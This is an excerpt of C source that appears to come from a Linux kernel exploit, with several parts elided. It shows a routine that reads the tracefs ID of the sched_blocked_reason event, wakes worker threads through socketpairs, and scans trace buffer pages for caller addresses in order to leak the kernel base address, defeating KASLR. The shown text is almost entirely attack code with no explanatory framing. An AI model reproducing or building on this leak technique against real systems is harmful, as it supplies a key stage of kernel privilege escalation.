...
static uint16_t g_slide_event_id = SLIDE_TRACEFS_EVENT_ID;

static uint16_t slide_tracefs_read_event_id(void) {
  int fd = open(SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/id",
                O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return SLIDE_TRACEFS_EVENT_ID;
  }
  char buf[32];
...
static void slide_tracefs_kick_workers(void) {
  for (int i = 0; i < 16; i++) {
    int sv[2];
...
static int slide_tracefs_parse_page(
  ...
  for (size_t pos = 16; pos + 4 <= end;) {
    ...
    if (event_id == g_slide_event_id && record_len >= 24) {
      uint64_t caller = 0;
...
static int slide_tracefs_leak_kernel_base(void) {
  ...
  g_slide_event_id = slide_tracefs_read_event_id();
  pr_info("slide tracefs event_id=%u\n", (unsigned)g_slide_event_id);
